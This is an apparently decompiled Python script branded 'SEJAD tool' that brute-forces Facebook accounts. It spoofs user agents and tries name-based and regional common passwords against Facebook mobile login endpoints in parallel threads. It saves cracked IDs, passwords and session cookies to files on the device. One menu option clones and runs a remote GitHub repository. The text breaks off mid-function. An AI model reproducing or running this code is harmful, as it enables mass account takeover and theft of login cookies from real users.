
# — — — — — — — — — — — — —
# Tool Made By @i6iii1
# Encoding: Pycdc 3.11
# Decode By @i6iii1
# Channel @mafiams1
# — — — — — — — — — — — — —


import lzma
import zlib
import codecs
import base64
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));
#DEVLOPE BY SEJAD
import marshal,os
#os.system('pip install httpx')
import httpx
#os.system('git pull')
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import requests,random,sys,json,os,re
from time import sleep
from os import system
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
import marshal
import zlib
import base64
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup
import requests as ress
from sys import exit as exit
import re
import sys
import uuid
import json
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
from datetime import datetime
from bs4 import BeautifulSoup
#os.system("pip install espeak") 
print('\033[1;37m[\033[1;34m•\033[1;37m] \033[1;32mPLEASE WAIT CHECKING UPDATE...\033[1;37m')
os.system('espeak -a 300 " please,Wait,Checking,Update,,"')
#os.system("apt upgrade")
print('\033[1;37m[\033[1;34m•\033[1;37m] \033[1;32mWELLCOM TO SEJAD TOOL...\033[1;37m')
os.system('espeak -a 300 " Wellcome , To , SEJAD , Tool,,"')



    
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gtt = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
build=f"SP1A.{random.randint(100000,999999)}.{random.randint(100,999)}"
ugen=[]
for xd in range(10000):
        aa='Mozilla/5.0 (X11; Linux x86_64'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(gtt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(100,114)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for agent in range(10000):
#)  
        aa='Mozilla/5.0 (X11; Linux x86_64 ;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(90,114)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Safari/537.36'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

logo=("""\033[1;37m
.d8888. d88888b    d88b  .d8b.  d8888b. 
88'  YP 88'        `8P' d8' `8b 88  `8D 
`8bo.   88ooooo     88  88ooo88 88   88 
  `Y8b. 88~~~~~     88  88~~~88 88   88 
db   8D 88.     db. 88  88   88 88  .8D 
`8888Y' Y88888P Y8888P  YP   YP Y8888D'
\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;37m[\033[1;32m•\033[1;37m] \033[1;37mAuthor     :\033[1;32m SEJAD-080
\033[1;37m[\033[1;32m•\033[1;37m] \033[1;37mGithub     :\033[1;32m 𝙎𝙀𝙅𝘼𝘿<≠>S4
\033[1;37m[\033[1;32m•\033[1;37m] \033[1;37mStatus     :\033[1;32m PAID
\033[1;37m[\033[1;32m•\033[1;37m] \033[1;37mVersion    :\033[1;32m 0.1
\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
def linex():
        print('\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
def clear():
        os.system('clear')
        print(logo)
loop=0
twf=[]
oks=[]
cps=[]
pcp=[]
id=[]
tp=0
lim=0
SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
ses = requests.Session()


  
def menu():
                        clear() 
                        print("\033[1;37m[\033[1;32m01\033[1;37m] \033[1;37mCRACK FILE")
                        print("\033[1;37m[\033[1;32m02\033[1;37m] \033[1;37mCRACK RANDOM")
                        print("\033[1;37m[\033[1;32m03\033[1;37m] \033[1;37mCREATE FILE")
                      #  print("\033[1;37m[\033[1;32m04\033[1;37m] \033[1;37mHow to use tutorial")
                        #print("\033[1;36m[\033[1;37m5\033[1;36m] \033[1;37mWorking pass for file")
                        #print("\033[1;36m[\033[1;37m6\033[1;36m] \033[1;37mJoin WhatsApp group ")
                        #print("\033[1;36m[\033[1;37m7\033[1;36m] \033[1;37mRepot to owner")
                        print("\033[1;37m[\033[1;32m01\033[1;37m] \033[1;37mExit ")
                        linex()
                        xd=input('\033[1;37m[\033[1;32m•\033[1;37m] \033[1;37mChoose: ')
                        if xd in ['1','01']:
                                clear()
                                file = input('\033[1;37m[\033[1;32m•\033[1;37m] \033[1;37mPut file \033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' File not available ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print('\033[1;37m[\033[1;32m01\033[1;37m] \033[1;37mMethod [1] \n\033[1;37m[\033[1;32m02\033[1;37m] \033[1;37mMethod [2] \n\033[1;37m[\033[1;32m03\033[1;37m] \033[1;37mMethod [3] ')
                                linex()
                                mthd=input('\033[1;37m[\033[1;32m•\033[1;37m]\033[1;37m Choose: ')
                                linex()
                                plist = []
                                print('\033[1;37m[\033[1;32m•\033[1;37m] \033[1;37mChoose [01] AND [02] ');linex();print('\033[1;37m[\033[1;32m01\033[1;37m] \033[1;37mCrack with auto pass \n\033[1;37m[\033[1;32m02\033[1;37m] \033[1;37mCrack with choice pass ');linex()
                                ppp=input('\033[1;37m[\033[1;32m•\033[1;37m] \033[1;37mChoose: ')
                                if ppp in ['1','01']:
                                        plist.append('firstfirst')
                                        plist.append('lastlast')
                                        plist.append('firstlast')
                                        plist.append('lastfirst')
                                        plist.append('first first')
                                        plist.append('last last')
                                        plist.append('first last')
                                        plist.append('last first')
                                        plist.append('first2020')
                                        plist.append('first1234')
                                        plist.append('first12345')
                                        plist.append('first123456')
                                        plist.append('first1234567')
                                        plist.append('first12345678')
                                        plist.append('first123456789')
                                        plist.append('firstlast@123')
                                        plist.append('first123123')
                                        plist.append('first2003')
                                        plist.append('first2004')
                                        plist.append('first2005')
                                        plist.append('first2006')
                                        plist.append('first2007')
                                        plist.append('first2008')
                                        plist.append('first2020')
                                        plist.append('first2021')
                                        plist.append('first2022')                      
                                                               
                                        
                                        
                                else:
                                        try:
                                                linex()
                                                ps_limit = int(input('\033[1;37m[\033[1;32m•\033[1;37m] \033[1;37mHow many passwords do you want to add ? '))
                                        except:
                                                ps_limit =1
                                        linex()
                                        print('\033[1;37m[\033[1;32m•\033[1;37m] \033[1;32mexp: first last,firtslast,first123')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f'\033[1;37m[\033[1;32m•\033[1;37m] \033[1;37mPut password {i+1}: '))
                                linex()
                                print('\033[1;37m[\033[1;32m•\033[1;37m] \033[1;37mDo you went show cp account? (\033[1;32my/\033[1;31mn\033[1;37m): ')
                                linex()
                                cx=input('\033[1;37m[\033[1;32m•\033[1;37m] \033[1;37mChoose: ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()                                        
                                        tl = str(len(fo))
                                        print('\033[1;37m[\033[1;32m•\033[1;37m] \033[1;37m𝐓𝐎𝐓𝐀𝐋 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 : \033[1;32m'+tl)
                                        print("\033[1;37m[\033[1;32m•\033[1;37m] \033[1;32m𝐔𝐒𝐈𝐍𝐆 𝐅𝐋𝐈𝐆𝐇𝐓 𝐌𝐎𝐃𝐄 𝐃𝐈𝐃 𝐍𝐎𝐓 𝐖𝐎𝐑𝐊")
                                        print("\033[1;37m[\033[1;32m•\033[1;37m] \033[1;32m𝐌𝐈𝐓 𝐖𝐀𝐒 𝐃𝐄𝐕𝐄𝐈𝐎𝐏𝐄𝐃 𝐁𝐘 𝙎𝙀𝙅𝘼𝘿")
                                        linex()
                                        #print("\033[1;37m[\033[1;32m•\033[1;37m] \033[1;32MIt Was Developed By SEJAD")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(api,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(graph,ids,names,passlist) 
                                                elif mthd in ['4','04']:
                                                        crack_submit.submit(graph1,ids,names,passlist)                                                       
                                                else:
                                                        crack_submit.submit(graph,ids,names,passlist)                                                        
                                print('\033[1;37m')
                                linex()
                                print(' The process has completed')
                                print(' Total OK: '+str(len(oks)))
                                print(' Total CP: '+str(len(cps)))
                                print(' Total 2F: '+str(len(twf)))
                                linex()
                                input(' Press enter to back ')
                                os.system('python JXB.py')
                        elif xd in ['2','02']:
                                clear()
                                print('[1] Pak bd afghan saudia clone\n[0] Back ')
                                linex()
                                x=input('[+] Choose: ')
                                if x in ['1','01']:
                                        pak()
                        
                                else:
                                        menu()
                        elif xd in ['3','03']:
                                os.system("git clone https://github.com/Hannan-404/FILE&cd FILE&python FILE.py")
                        elif xd in ['4','04']:
                                os.system('xdg-open https://fb.watch/ikMLhudxhU/');menu() 
                        elif xd in ['5','05']:
                                crack()                               
                        elif xd in ['6','06']:
                                wx=('G2UfzG9uqDgFVVVHXUYUln')
                                os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
                        elif xd in ['7','07']:
                                os.system("xdg-open wa.me/+923231243823")   
def pak():
                user=[]
                clear()
                menu()
                print('\033[1;31m[+] PAK CODE: 0306,0315,0335,0345')
                print('\033[1;31m[+] BANGLADESH CODE: 016,017,018,019')
                print('\033[1;31m[+] SAUDIA CODE : 059,056,053,054 etc')
                print('\033[1;31m[+] AFGHANISTAN CODE: 9377,9370,9372,9379')
                code = input('\033[1;37m[+] put code: ')
                try:
                        limit = int(input('\033[1;31m[+] example: 2000, 3000, 5000, 10000\n\033[1;37m[+] put limit: '))
                except ValueError:
                        limit = 50000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as oussama:     
                        clear()
                        tl = str(len(user))
                        print('[+] Total account : \033[1;32m'+tl)
                        print(f'\033[1;37m[+]\033[1;35m Use flight mode for speed up\033[1;97m')
                        linex()                        
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan123','khankhan','786786','khan123','khan12345','khan123456','khanbaba','khan786','khankhan12345','malik123','malik12345','khanzada','kingkhan','khan1234','aliali','alikhan','pak123','ali123','baloch','baloch123','khan1122','khan12','Bangladesh','bangladesh','i love you','iloveyou','bukhari00786','syed00786','free fire','freefire','afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']
                                oussama.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python JXB.py')
xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")               

def crack():
                                        clear()
                                        print(' \033[1;32mWorking password for Pakistan\033[1;37m ')
                                        linex()
                                        print(' [1] first last\n [2] firstlast\n [3] first123\n [4] first1234\n [5] first786\n [6] first110\n [7] firstlast123\n [8] firstlast786\n [9] firstlast110')
                                        linex()
                                        print('\033[1;32m Out of Pakistan working password\033[1;37m ')
                                        linex()
                                        print(' [1] first last\n [2] firstlast\n [3] first1234\n [4] First Last\n [5] first123 ')
                                        linex()
                                        print(' \033[1;32mfor new ids use just 1 password \033[1;37m \n [1] first last > best results \n \033[1;32melse\033[1;37m \n [1] first last\n [2] firstlast\n [3] First Last\n [4] First Last')
                                        linex()
                                        input(' Press enter to back menu ')
                                        menu()
def api(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[SEJAD-M1] %s\033[1;32m [\033[1;32mOK-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Aws=session.cookies.get_dict().keys()
                        if "c_user" in Aws:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m[SEJAD-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SEJAD_OK_ids_M1.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/oussama_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                                #open('/sdcard/oussama-M1-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m[SEJAD-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SEJAD-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
def api1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[SEJAD-M2] %s\033[1;32m [\033[1;32mOK-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Aws=session.cookies.get_dict().keys()
                        if "c_user" in Aws:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m[SEJAD-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SEJAD_OK_ids_M2.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/oussama_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                              #  open('/sdcard/oussama-M2-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m[SEJAD-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SEJAD-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1


def graph(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[SEJAD-M3] %s\033[1;32m [\033[1;32mOK-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'm.facebook.com',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'accept-language': 'fr-DZ,fr;q=0.9,ar-DZ;q=0.8,ar;q=0.7,fr-FR;q=0.6,en-US;q=0.5,en;q=0.4',
                        'cache-control': 'max-age=0',
                        'dpr': '3',
                        'sec-ch-prefers-color-scheme': 'light',
                        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                        'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-model': '""',
                        'sec-ch-ua-platform': '"Linux"',
                        'sec-ch-ua-platform-version': '""',
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'cross-site',
                        'sec-fetch-user': '?1',
                        'upgrade-insecure-requests': '1',
                        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        'viewport-width': '980',}

                        getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Aws=session.cookies.get_dict().keys()
                        if "c_user" in Aws:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m[SEJAD-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SEJAD_OK_ids_M3.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/oussama_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                               # open('/sdcard/oussama-M3-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m[SEJAD-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SEJAD-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
def graph1(ids,names,passlist):
        global loop,oks,cps
